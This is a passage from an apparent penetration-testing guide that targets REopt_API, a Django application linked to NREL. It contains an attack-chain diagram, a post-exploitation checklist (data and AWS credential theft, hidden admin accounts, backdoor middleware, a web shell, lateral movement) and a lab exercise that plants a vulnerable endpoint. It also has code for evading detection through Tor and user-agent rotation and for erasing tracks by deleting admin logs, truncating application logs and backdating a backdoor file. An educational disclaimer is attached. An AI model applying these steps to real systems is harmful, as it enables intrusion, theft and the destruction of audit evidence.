‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ From Regular User ‚Üí Admin:                                     ‚îÇ
‚îÇ   ‚Üí Use SQL injection to UPDATE auth_user (is_superuser=true) ‚îÇ
‚îÇ   ‚Üí Or exploit permission bypass in API endpoints              ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îÇ From Admin ‚Üí RCE:                                              ‚îÇ
‚îÇ   ‚Üí Django admin shell access                                  ‚îÇ
‚îÇ   ‚Üí Execute arbitrary Python code                              ‚îÇ
‚îÇ   ‚Üí os.system() for shell commands                             ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îÇ From Container ‚Üí Host (if Docker):                             ‚îÇ
‚îÇ   ‚Üí Check for docker.sock mount                                ‚îÇ
‚îÇ   ‚Üí Escape to host system                                      ‚îÇ
‚îÇ   ‚Üí Exploit kernel vulnerabilities                             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ PHASE 4: POST-EXPLOITATION (30 min)                            ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Data Exfiltration:                                              ‚îÇ
‚îÇ   ‚úì Database dump (users, projects, energy data)               ‚îÇ
‚îÇ   ‚úì Application secrets (API keys, DB passwords)               ‚îÇ
‚îÇ   ‚úì Source code repository                                     ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îÇ Persistence:                                                    ‚îÇ
‚îÇ   ‚úì Create hidden admin account (.system)                      ‚îÇ
‚îÇ   ‚úì Inject backdoor middleware                                 ‚îÇ
‚îÇ   ‚úì Add SSH keys for remote access                             ‚îÇ
‚îÇ   ‚úì Deploy web shell in /static/                               ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îÇ Lateral Movement:                                               ‚îÇ
‚îÇ   ‚úì Scan internal network for other NREL systems               ‚îÇ
‚îÇ   ‚úì Steal AWS credentials from environment                     ‚îÇ
‚îÇ   ‚úì Abuse NREL API keys for other services                     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            ‚Üì
                    [MISSION COMPLETE]
              Full system compromise achieved
```

---

## 8. Practical Lab Exercises

### Exercise 1: SQL Injection Challenge

**Objective:** Exploit SQL injection to extract admin credentials

**Setup:**
```python
# Add vulnerable endpoint to reopt_api/views.py
from django.http import JsonResponse
from django.contrib.auth.models import User

def vulnerable_search(request):
    field = request.GET.get('field', 'username')
    query = request.GET.get('q', '')

    # VULNERABLE
    results = User.objects.filter(username__icontains=query).values(field)
    return JsonResponse(list(results), safe=False)

# Add to urls.py
path('api/search/', vulnerable_search),
```

**Tasks:**
1. Identify the vulnerable parameter
2. Extract the admin username
3. Extract the admin password hash
4. Crack the hash
5. Login as admin

**Solution Script:**
```python
# See exploitation section 4.1
```

---

### Exercise 2: Timing Attack Lab

**Objective:** Enumerate 5 valid usernames using timing analysis

**Setup:**
- Create 10 users (5 with random names, 5 with common names)
- Your job: identify which 5 are valid

**Tasks:**
1. Measure baseline timing for invalid usernames
2. Test a list of 50 candidates
3. Identify the 5 real users with >95% confidence

**Solution Script:**
```python
# See exploitation section 4.2
```

---

### Exercise 3: Full Chain Exploitation

**Objective:** Go from anonymous ‚Üí root in under 2 hours

**Constraints:**
- No source code access (black box)
- No hints about usernames or passwords
- Production-like configuration (DEBUG=False)

**Success Criteria:**
1. Gain authenticated access (any user)
2. Escalate to admin
3. Execute `whoami` command on the system
4. Extract database contents
5. Create persistent backdoor

---

## 9. Defense Evasion & OpSec

### 9.1 Avoiding Detection

**Slow and Low:**
```python
import time
import random

def rate_limited_request(url, max_rpm=60):
    """
    Make requests with random delays to avoid detection
    """
    delay = (60 / max_rpm) + random.uniform(0, 5)
    time.sleep(delay)
    return requests.get(url)
```

**Rotate User Agents:**
```python
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
    # ... more
]

headers = {'User-Agent': random.choice(user_agents)}
requests.get(url, headers=headers)
```

**Use Proxies:**
```python
proxies = {
    'http': 'socks5://127.0.0.1:9050',  # Tor
    'https': 'socks5://127.0.0.1:9050',
}

requests.get(url, proxies=proxies)
```

---

### 9.2 Cleaning Tracks

**Clear Django Logs:**
```python
# Via Django shell
from django.contrib.admin.models import LogEntry
LogEntry.objects.filter(user__username='backdoor_admin').delete()

# Clear application logs
import os
os.system('truncate -s 0 /var/log/django/app.log')
```

**Modify Timestamps:**
```bash
# Make backdoor file appear old
touch -t 202201010000 /path/to/backdoor.py
```

---

## 10. Conclusion

This penetration testing guide demonstrates multiple attack paths against REopt_API running Django 4.0.7:

### Key Vulnerabilities Exploited:
1. **SQL Injection (CVE-2024-39330)** - Most critical, allows full DB access
2. **Timing Attacks (CVE-2024-39329)** - Enables username enumeration
3. **DoS Vulnerabilities** - Can disable the service
4. **Dependency Chain** - Celery, Pillow, and other library CVEs

### Skills Learned:
- Web application reconnaissance
- SQL injection exploitation (manual and automated)
- Timing-based side-channel attacks
- Privilege escalation techniques
- Post-exploitation and persistence
- Defense evasion

### Next Steps for Learning:
1. Set up the lab environment
2. Work through each exercise
3. Try creating your own exploits
4. Study the remediation recommendations
5. Practice on legal CTF platforms (HackTheBox, TryHackMe)

---

**DISCLAIMER:** This guide is for educational purposes only. Unauthorized access to computer systems is illegal. Only perform security testing on systems you own or have explicit written permission to test.

---

**Tools Reference:**
- SQLMap: https://sqlmap.org
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org
- John the Ripper: https://www.openwall.com/john/
- Metasploit: https://www.metasploit.com

**Legal Frameworks:**
- Computer Fraud and Abuse Act (CFAA): 18 U.S.C. ¬ß 1030
- Responsible Disclosure Guidelines: https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html
